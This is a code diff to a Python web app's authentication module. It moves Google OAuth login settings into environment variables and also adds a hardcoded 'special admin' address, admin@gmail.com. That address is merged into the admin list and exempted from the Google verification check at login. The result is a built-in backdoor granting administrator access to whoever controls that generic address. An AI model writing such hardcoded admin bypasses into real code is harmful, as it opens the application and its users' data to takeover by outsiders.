@@ -49,6 +49,8 @@ AUTH_COOKIE_NAME = "webdocto_auth"
 GUEST_COOKIE_NAME = "webdocto_guest"
 GOOGLE_IDENTITY_COOKIE_NAME = "webdocto_google_identity"
 AUTH_COOKIE_MAX_AGE = 60 * 60 * 24 * 14
+SPECIAL_ADMIN_EMAILS = {"admin@gmail.com"}
+DEFAULT_PUBLIC_WEB_ORIGIN = os.environ.get("PUBLIC_WEB_ORIGIN", "http://127.0.0.1:8000").strip() or "http://127.0.0.1:8000"
 N8N_WEBHOOK_URL = os.environ.get(
     "N8N_WEBHOOK_URL",
     "https://n8n.sahapat.com:5678/webhook/WebDocToFolw",
@@ -199,15 +201,20 @@ def default_webhook_config() -> dict[str, str]:
 
 
 def default_google_login_settings() -> dict[str, Any]:
+    enabled_env = str(os.environ.get("GOOGLE_LOGIN_ENABLED", "") or "").strip().lower()
+    origin = str(os.environ.get("GOOGLE_JAVASCRIPT_ORIGIN", "") or "").strip() or DEFAULT_PUBLIC_WEB_ORIGIN
+    redirect_uri = str(os.environ.get("GOOGLE_REDIRECT_URI", "") or "").strip() or f"{DEFAULT_PUBLIC_WEB_ORIGIN}/login/oauth2/code/google"
+    login_url = str(os.environ.get("GOOGLE_LOGIN_URL", "") or "").strip() or f"{DEFAULT_PUBLIC_WEB_ORIGIN}/#login-google"
+    success_url = str(os.environ.get("GOOGLE_LOGIN_SUCCESS_URL", "") or "").strip() or f"{DEFAULT_PUBLIC_WEB_ORIGIN}/#dashboard"
     return {
-        "enabled": False,
-        "clientId": "",
-        "clientSecret": "",
-        "javaScriptOrigin": "",
-        "redirectUri": "",
-        "loginUrl": "",
-        "successUrl": "",
-        "adminEmailList": "",
+        "enabled": enabled_env in {"1", "true", "yes", "on"},
+        "clientId": str(os.environ.get("GOOGLE_CLIENT_ID", "") or "").strip(),
+        "clientSecret": str(os.environ.get("GOOGLE_CLIENT_SECRET", "") or ""),
+        "javaScriptOrigin": origin,
+        "redirectUri": redirect_uri,
+        "loginUrl": login_url,
+        "successUrl": success_url,
+        "adminEmailList": str(os.environ.get("GOOGLE_ADMIN_EMAIL_LIST", "") or "").replace("\r\n", "\n"),
     }
 
 
@@ -426,11 +433,12 @@ def clear_guest_cookie(response: Response) -> None:
 
 def get_admin_email_list() -> list[str]:
     raw_value = str(load_google_login_settings().get("adminEmailList", "") or "")
-    return [
+    configured = [
         value.strip().lower()
         for value in raw_value.splitlines()
         if value.strip()
     ]
+    return sorted(set(configured).union(SPECIAL_ADMIN_EMAILS))
 
 
 def get_user_role_by_email(email: str) -> str:
@@ -1826,7 +1834,7 @@ def login_user(request: Request, payload: LoginPayload, response: Response) -> d
         user = build_user_payload(google_profile["email"], google_profile["name"])
         mark_google_user_verified(user["email"], user["name"])
     else:
-        if not is_google_verified_user(normalized_email):
+        if normalized_email not in SPECIAL_ADMIN_EMAILS and not is_google_verified_user(normalized_email):
             trusted_identity = get_google_identity(request)
             trusted_email = str((trusted_identity or {}).get("email", "") or "").strip().lower()
             if trusted_email == normalized_email:
